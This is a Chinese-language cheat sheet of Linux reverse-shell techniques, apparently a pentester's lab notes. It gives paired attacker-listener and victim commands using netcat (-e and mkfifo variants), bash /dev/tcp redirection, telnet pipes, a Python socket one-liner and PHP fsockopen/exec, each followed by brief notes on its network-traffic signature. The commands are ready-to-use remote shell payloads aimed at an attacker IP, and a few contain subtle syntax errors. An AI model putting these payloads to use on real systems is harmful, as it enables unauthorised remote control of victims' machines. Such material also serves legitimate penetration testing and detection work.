    Linux反弹Shell

    攻击电脑：192.168.64.132

    受害电脑：192.168.64.133

    未作特别说明，都是在Linux进行反弹Shell

    交互式界面：

    Nc方式

    前提：安装有NetCat工具

    方式一

    前提：nc工具有 “ -e ” 参数

    攻击者：nc -lvvp port

    受害者：nc -e /bin/bash x.x.x.x port

    方式二

    PS：nc工具没有 “ -e ” 参数

    攻击者：nc -lvvp port

    受害者：rm /tmp/f ; mkfifo /tmp/f;cat /tmp/f | /bin/bash -i 2>&1 | nc 攻击者IP 端口 >/tmp/f

    解释：

    ​ ①mkfifo 命令的作用是创建FIFO特殊文件，通常也称为命名管道，FIFO文件在磁盘上没有数据块，仅用来标识内核中的一条通道，各进程可以打开FIFO文件进行read/write，实际上是在读写内核通道（根本原因在于FIFO文件结构体所指向的read、write函数和常规文件不一样），这样就实现了进程间通信

    ​ ②会创建管道文件 “ f ”，文件名可以自定义，例如 “ yum.bak ”

    ​ ③字母为“p”表示该文件为命令管道文件。与shell编程有关的文件。

    方式三

    PS：nc工具没有 “ -e ” 参数

    攻击者：使用nc监听两个端口一个读，一个回显

    受害者：rm /tmp/f ; mkfifo /tmp/f;cat /tmp/f | /bin/bash -i 2>&1 | nc 攻击者IP 端口 >/tmp/f

    流量特征：

    ​ ①明文传输，能够被流量监测设备检测

    Bash方式

    前提：攻击者电脑安装netcat工具

    方式一

    执行命令：nc -lvvp 监听端口

    受害者电脑执行：bash -i >& /dev/tcp/攻击者IP/监听端口 0 > &1

    方式二

    执行命令：nc -lvvp 监听端口

    受害者电脑执行：0<&LSR;exec LSR<>/dev/tcp/攻击者IP/攻击者监听端口; sh <&LSR >&LSR 2>&LSR

    PS：若不行则将 ” LSR “ 换成 “ 196 ” （不了解原理）

    方式三

    执行命令：nc -lvvp 监听端口

    受害者电脑执行：**/bin/bash -i > /dev/tcp/攻击者IP/端口 0<&1 2>&1**

    方式四

    执行命令：nc -lvvp 监听端口

    受害者电脑执行：exec 5<>/dev/tcp/攻击者IP地址/端口;cat <&5 | while read line; do $line 2>&5 >&5; done

    流量特征：

    ​ ①使用TCP进行传输，内容没有进行编码或加解密

    ​ ②通过对流量进行分析可以发现攻击者执行的内容

    ​ ③不管使用哪种方式进行反弹Shell，流量特征都如下所示

    Telnet方式

    前提：攻击者电脑安装telnet工具

    方式一

    执行命令：nc -lvvp 监听端口

    受害者电脑执行：telnet 攻击者IP 端口01 | /bin/bash | telnet 攻击者IP 端口02

    方式二

    执行命令：nc -lvvp 监听端口

    受害者电脑执行：mknod backpipe p && telnet 攻击者IP 端口 0<backpipe | /bin/bash 1>backpipe

    流量特征：

    ​ ①所有交互流量还是明文传输，流量监测设备能够检测到

    ​ ②一个nc执行命令，一个nc回显结果，但受害机器上也会回显执行的命令

    ​ ③这几种方式流量特征几乎一样，仅做一次记录（反弹shell的方式不一样而已）

    Python方式

    Linux主机一般安装(自带)有python，利用python实现交互式终端shell

    方式一

    攻击者：nc -lvvp 端口

    受害者下：

    python -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“攻击者IP”,端口));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([“/bin/bash”,”-i”]);’

    解释：

    ​ 生成新的进程，调用/bin/sh

    ​ shell就会被subprocess调用，并用socket传输的数据替代stdin，stdout，stderr，使得在本地就能操作宿主机

    流量特征：

    ​ ①所有交互流量还是明文传输，流量监测设备能够检测到

    ​ ②使用python执行，没有其它什么优势

    Php方式

    前提：安装有PHP环境

    方式一

    攻击者：nc -lvvp 端口

    受害者下：php -r ‘$sock=fsockopen(“攻击者IP”,端口);exec(“/bin/bash -i <&3 >&3 2>&3”);’

    方式二

    前提：php反弹shell的这些方法都需要php关闭safe_mode这个选项，才可以使用exec函数。

    攻击者：nc -lvvp 端口

    受害者下：php- ‘exec(“/bin/bash -i >& /dev/tcp/攻击者IP/攻击者端口”)’
